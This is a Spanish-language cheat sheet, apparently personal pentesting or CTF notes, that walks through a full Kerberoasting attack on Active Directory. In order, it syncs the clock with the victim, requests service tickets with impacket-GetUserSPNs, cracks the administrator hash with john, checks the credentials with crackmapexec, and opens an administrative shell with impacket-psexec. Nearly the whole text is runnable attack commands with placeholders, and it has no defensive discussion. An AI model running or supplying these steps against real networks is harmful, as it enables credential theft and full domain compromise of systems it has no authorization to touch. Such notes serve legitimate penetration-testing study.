# KERBEROASTING en Active Directory

Generalmente se utiliza este ataque cuando tenemos unas credenciales validas de un usuario y dicho usuario es vulnerable a un `Kerberoasting` por lo que si se diera el caso, podremos hacer lo siguiente.

## Establecer al misma franja horaria con la de la maquina victima

Primero tendremos que tener la misma franja horaria con la de la maquina victima (Que los relojes esten sincronizados, por que si no dara error) y podremos hacerlo de la siguiente forma:

```shell
ntpdate <IP_VICTIM>
```

Y con esto ya estaria sincronizado, por lo que podremos hacer el ataque.

## Ataque de Kerberoasting

```shell
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request
```

Lo que estamos haciendo con este comando es intentar obtener el `ticket granting service` y con este ticket lo que podemos hacer es obtener el hash de la contraseña del usuario `administrador`.

Si lo ejecutamos lo que nos proporcionara sera el hash del usuario `administrador` que se vera algo como...

```
$krb5tgs$23$*Administrator$<DOMAIN>.LOCAL$<DOMAIN>/Administrator*$<HASH_ADMIN>...
```

Y para poder saber si es vulnerable a este ataque lo podremos ver con el siguiente comando:

```shell
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD>
```

Esto si nos devuelve informacion es que si es vulnerable.

## Crackear hash admin

Copiaremos el hash que nos proporciono el comando y lo pegaremos en un archivo para posteriormente crackearlo.

```shell
nano hash

#Dentro del nano
$krb5tgs$23$*Administrator$<DOMAIN>.LOCAL$<DOMAIN>/Administrator*$<HASH_ADMIN>...
```

Lo guardamos y haremos lo siguiente:

```shell
john --wordlist=<WORDLIST> hash
```

Si todo sale bien, obtendremos la contarseña del admin en texto plano, para posteriormente conectarnos con dichas credenciales.

Podremos probar dichas credenciales con la siguiente herramienta...

## Comprobacion de credenciales

```shell
crackmapexec smb <IP_VICTIM> -u 'Administartor' -p '<PASSWORD>'
```

Y si esto nos devuelve un `[+]........(Pwn3d!)` seguido de mas informacion, veremos que son correctas.

## Conexion a la maquina con admin

Por lo que ahora nos conectaremos a la maquina victima mediante dichas credenciales:

```shell
impacket-psexec <DOMAIN>/Administrator:<PASSWORD>@<IP_VICTIM> cmd.exe
```

Y con esto ya estariamos dentro como `administradores`.
